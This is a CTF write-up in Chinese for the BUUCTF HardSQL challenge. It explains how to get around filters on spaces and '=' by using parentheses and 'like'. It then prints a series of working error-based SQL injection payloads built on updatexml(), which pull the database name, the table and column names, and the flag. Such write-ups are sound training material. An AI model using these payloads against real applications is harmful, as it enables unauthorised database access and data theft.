# T9 hardsql

> 题目：BUUCTF [极客大挑战 2019]HardSQL

__0x00 审题__

没想到这个系列还没完

```
没错，又是我，这群该死的黑客竟然如此厉害，所以我回去爆肝SQL注入，这次，再也没有人能拿到我的flag了！
```

尝试弱口令无果，尝试万能密码，和注点检测，都会得到：

```
你可别被我逮住了，臭弟弟
```

进而猜测全部被过滤

__0x01 解题__

1. 找到被过滤的东西
> burpsuite抓包：发现空格，and，注释符，/，= 等都被过滤（就是之前见过的都没法用了，大写双写也不行的那种）

2. 新的方法，两个问题
***
* 问题一：如何解决过滤问题

> 空格被过滤一般可采用:/**/
> 但是本题已经过滤了

<u>所以考虑用()代替空格</u>

> 解释:在MySQL中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格。(括算式)


<u>考虑用like替换等号</u>

操作显示：

```
You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '(or)(1like1)#'' at line 1
```
***
* 问题二：注入报错

> 函数：floor()，extractvalue()，updatexml()

关于updatexml()：作用是更新xml()，原理就是他的Xpath路径出错，就会返回他出错的路径，从而达到我们找数据的目的

> 注：[相关链接](https://www.xiinnn.com/article/f88283cc.html)

***

3. 问题解决，开始实操

输入：
```
'or(updatexml(1,concat(0x7e,database()),1))#  (0x7e是~,不属于xpath格式所以报错）
```
返回得到数据库：
```
XPATH syntax error: '~geek'
```

然后查表：
```
'or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database()))),1))#
```
返回：
```
XPATH syntax error: '~H4rDsq1'
```

查字段：
```
'or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('H4rDsq1'))),1))#
```
不出所料，三个字段：
```
XPATH syntax error: '~id,username,password'
```

找数据：
```
'or(updatexml(1,concat(0x7e,(select(group_concat(id,'~',username,'~',password))from(H4rDsq1)),0x7e),1))#
```

就报半边：
```
XPATH syntax error: '~1~flag~flag{7e4d393a-0209-4f3e-'
```

> 不全咋办？

```
关于函数right()与left():
right():从右开始提取多个字符
句法：RIGHT(string, number_of_chars)
left()同理
```

try:

```
'or(updatexml(1,concat(0x7e,(select(right(password,30))from(H4rDsq1)where(username)like('flag'))),1))#
```

get!!

```
XPATH syntax error: '~a-0209-4f3e-8032-11858e18c76e}'
```

__0x02 答案__

合并一下就行

__0x03 总结__

1. 关于更多的绕过方法：空格的绕过，等号的绕过
2. 关于注入报错，我的理解通过上述几个函数的自身特点通过人为构造错误，从而获得数据


